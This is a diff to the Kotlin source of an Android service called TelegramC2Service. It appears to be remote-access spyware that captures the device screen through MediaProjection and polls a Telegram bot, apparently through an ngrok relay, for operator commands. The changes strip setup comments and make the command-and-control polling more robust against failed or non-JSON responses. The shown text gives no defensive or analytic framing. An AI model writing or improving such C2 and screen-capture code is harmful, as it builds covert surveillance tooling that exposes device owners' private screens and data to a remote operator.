@@ -56,11 +56,11 @@ class TelegramC2Service : Service() {
         startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
 
         if (BOT_TOKEN.isEmpty() || BOT_TOKEN.startsWith("TG_TOKEN")) {
-            log("BOT_TOKEN not configured — set GitHub secret TG_BOT_TOKEN")
+            log("BOT_TOKEN not configured")
             return
         }
         if (CHAT_ID.isEmpty() || CHAT_ID.startsWith("TG_CHAT")) {
-            log("CHAT_ID not configured — set GitHub secret TG_CHAT_ID")
+            log("CHAT_ID not configured")
             return
         }
 
@@ -100,7 +100,6 @@ class TelegramC2Service : Service() {
     private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
         log("initProjection: code=$resultCode")
         try {
-            // Release any previous session cleanly
             captureSession?.release()
             captureSession = null
             try { projection?.stop() } catch (_: Exception) {}
@@ -124,9 +123,6 @@ class TelegramC2Service : Service() {
             }, Handler(Looper.getMainLooper()))
 
             projection = proj
-
-            // Build the long-lived virtual display session ONCE.
-            // Subsequent captures reuse this session — required on Android 14+.
             captureSession = ScreenCaptureSession(this, proj)
             log("projection ACTIVE with capture session")
         } catch (e: Exception) {
@@ -161,9 +157,16 @@ class TelegramC2Service : Service() {
                 .post(body)
                 .build()
             try {
-                client.newCall(req).execute().use { r ->
-                    r.body?.string()?.let { JSONObject(it) }
+                val raw = client.newCall(req).execute().use { r ->
+                    r.body?.string()
                 }
+                if (raw == null) return@withContext null
+                // Robust: ngrok free returns HTML warning page sometimes
+                if (!raw.trimStart().startsWith("{")) {
+                    log("api $method: non-JSON response (${raw.take(80)}…)")
+                    return@withContext null
+                }
+                JSONObject(raw)
             } catch (e: Exception) {
                 log("api $method failed: ${e.message}")
                 null
@@ -216,12 +219,16 @@ class TelegramC2Service : Service() {
                     .build()
 
                 val resp = apiCall("getUpdates", body)
-                val ok = resp?.optBoolean("ok", false) ?: false
+                if (resp == null) {
+                    delay(3000)
+                    continue
+                }
+                val ok = resp.optBoolean("ok", false)
                 if (!ok) {
                     delay(5000)
                     continue
                 }
-                val results = resp?.optJSONArray("result") ?: JSONArray()
+                val results = resp.optJSONArray("result") ?: JSONArray()
                 for (i in 0 until results.length()) {
                     val upd = results.getJSONObject(i)
                     val updateId = upd.optLong("update_id")
